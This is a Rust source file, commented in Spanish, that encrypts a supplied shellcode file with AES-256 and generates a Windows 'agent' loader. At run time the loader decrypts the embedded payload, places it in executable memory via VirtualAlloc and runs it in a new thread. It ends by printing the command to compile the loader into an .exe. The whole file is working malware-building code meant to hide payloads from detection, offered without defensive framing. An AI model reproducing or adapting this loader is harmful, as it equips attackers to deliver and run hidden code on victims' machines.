// File: src/encrypt.rs
// Función para encriptar shellcode en AES-256-CBC

extern crate aes;
extern crate cbc;
extern crate pbkdf2;
extern crate sha2;
extern crate hex;
extern crate hmac;
extern crate rand;
use aes::Aes256;
use cbc::{cipher::{block_padding::Pkcs7, BlockEncryptMut, BlockDecryptMut, KeyIvInit}, Encryptor, Decryptor};
use rand::RngCore;
use std::fs::File;
use std::io::{Read, Write};

type Aes256CbcEnc = Encryptor<Aes256>;
type Aes256CbcDec = Decryptor<Aes256>;

const KEY_SIZE: usize = 32; // AES-256
const IV_SIZE: usize = 16;  // AES block size

pub fn encrypt_shellcode(shellcode: &[u8]) -> (Vec<u8>, Vec<u8>, Vec<u8>) {
    // Generate random key
    let mut key = vec![0u8; KEY_SIZE];
    rand::thread_rng().fill_bytes(&mut key);

    // Generate random IV
    let mut iv = vec![0u8; IV_SIZE];
    rand::thread_rng().fill_bytes(&mut iv);

    // Calculate padded size
    let block_size = 16;
    let padded_len = ((shellcode.len() + block_size) / block_size) * block_size;
    let mut buffer = vec![0u8; padded_len];
    buffer[..shellcode.len()].copy_from_slice(shellcode);
    
    // Encrypt the shellcode using AES-256-CBC
    let cipher = Aes256CbcEnc::new_from_slices(&key, &iv).unwrap();
    let encrypted_data = cipher.encrypt_padded_mut::<Pkcs7>(&mut buffer, shellcode.len()).unwrap();

    (encrypted_data.to_vec(), key, iv)
}

pub fn generate_agent(shellcode_file: &str, output_name: &str) -> Result<(), Box<dyn std::error::Error>> {
    // Read the shellcode file
    let mut file = File::open(shellcode_file)?;
    let mut shellcode = Vec::new();
    file.read_to_end(&mut shellcode)?;

    println!("📊 Tamaño del shellcode: {} bytes", shellcode.len());

    // Encrypt the shellcode
    let (encrypted_data, key, iv) = encrypt_shellcode(&shellcode);

    println!("🔒 Shellcode encriptado: {} bytes", encrypted_data.len());

    // Create the agent code with embedded encrypted data
    let agent_code = format!(r#"use aes::Aes256;
use cbc::{{cipher::{{block_padding::Pkcs7, BlockDecryptMut, KeyIvInit}}, Decryptor}};
use std::mem::transmute;
use std::ptr::copy;
use winapi::um::winnt::{{PAGE_EXECUTE_READWRITE, MEM_COMMIT, MEM_RESERVE}};
use winapi::um::memoryapi::VirtualAlloc;
use winapi::um::processthreadsapi::{{CreateThread, WaitForSingleObject}};
use winapi::um::winbase::INFINITE;
use winapi::shared::minwindef::DWORD;

type Aes256CbcDec = cbc::Decryptor<Aes256>;

// Embedded encrypted data
const ENCRYPTED_SHELLCODE: &[u8] = &{:?};
const KEY: &[u8] = &{:?};
const IV: &[u8] = &{:?};

fn decrypt_shellcode() -> Vec<u8> {{
    let cipher = Aes256CbcDec::new_from_slices(KEY, IV).unwrap();
    let mut buffer = ENCRYPTED_SHELLCODE.to_vec();
    cipher.decrypt_padded_mut::<Pkcs7>(&mut buffer).unwrap().to_vec()
}}

fn main() {{
    unsafe {{
        let shellcode = decrypt_shellcode();
        
        let mem = VirtualAlloc(
            std::ptr::null_mut(),
            shellcode.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        );
        
        if mem.is_null() {{
            return;
        }}
        
        copy(shellcode.as_ptr(), mem as *mut u8, shellcode.len());
        
        let func: extern "system" fn() -> DWORD = transmute(mem);
        let thread = CreateThread(
            std::ptr::null_mut(),
            0,
            Some(transmute(func as *const ())),
            std::ptr::null_mut(),
            0,
            std::ptr::null_mut(),
        );
        
        if !thread.is_null() {{
            WaitForSingleObject(thread, INFINITE);
        }}
    }}
}}
"#, 
        encrypted_data, 
        key, 
        iv
    );

    // Write the agent file
    let agent_file = format!("{}.rs", output_name);
    let mut output_file = File::create(&agent_file)?;
    output_file.write_all(agent_code.as_bytes())?;

    println!("✅ Agente generado: {}", agent_file);
    println!("📝 Para compilar: rustc {} -o {}.exe", agent_file, output_name);
    
    Ok(())
}